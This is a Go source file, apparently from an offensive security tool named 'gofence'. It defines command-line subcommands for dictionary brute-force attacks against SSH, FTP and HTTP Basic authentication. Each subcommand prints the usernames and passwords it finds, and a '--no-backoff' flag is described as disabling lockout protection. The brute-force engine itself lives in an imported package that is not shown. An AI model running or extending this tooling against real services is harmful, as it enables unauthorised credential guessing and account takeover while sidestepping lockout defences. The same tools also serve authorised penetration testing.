package cmd

import (
	"fmt"

	"github.com/nixteg/gofence/internal/exploit"
	"github.com/spf13/cobra"
)

var (
	bruteUser      string
	bruteWordlist  string
	bruteNoBackoff bool
)

var bruteCmd = &cobra.Command{
	Use:   "brute",
	Short: "Brute force SSH/FTP/HTTP services",
}

var bruteSSH = &cobra.Command{
	Use:   "ssh <alvo>",
	Short: "SSH dictionary attack",
	Args:  cobra.ExactArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		engine := exploit.NewBruteEngine(concur, bruteNoBackoff)
		for r := range engine.BruteSSH(args[0], bruteUser, bruteWordlist) {
			fmt.Printf("[FOUND] ssh %s user=%s pass=%s\n", r.Target, r.Username, r.Password)
		}
		return nil
	},
}

var bruteHTTP = &cobra.Command{
	Use:   "http <url>",
	Short: "HTTP Basic auth brute force",
	Args:  cobra.ExactArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		engine := exploit.NewBruteEngine(concur, bruteNoBackoff)
		for r := range engine.BruteHTTP(args[0], bruteUser, bruteWordlist) {
			fmt.Printf("[FOUND] http %s user=%s pass=%s\n", r.Target, r.Username, r.Password)
		}
		return nil
	},
}

var bruteFTP = &cobra.Command{
	Use:   "ftp <alvo>",
	Short: "FTP dictionary attack",
	Args:  cobra.ExactArgs(1),
	RunE: func(cmd *cobra.Command, args []string) error {
		engine := exploit.NewBruteEngine(concur, bruteNoBackoff)
		for r := range engine.BruteFTP(args[0], bruteUser, bruteWordlist) {
			fmt.Printf("[FOUND] ftp %s user=%s pass=%s\n", r.Target, r.Username, r.Password)
		}
		return nil
	},
}

func init() {
	for _, c := range []*cobra.Command{bruteSSH, bruteHTTP, bruteFTP} {
		c.Flags().StringVarP(&bruteUser, "user", "u", "", "username")
		c.Flags().StringVarP(&bruteWordlist, "wordlist", "w", "", "password wordlist")
		c.Flags().BoolVar(&bruteNoBackoff, "no-backoff", false, "disable lockout protection")
		bruteCmd.AddCommand(c)
	}
	rootCmd.AddCommand(bruteCmd)
}
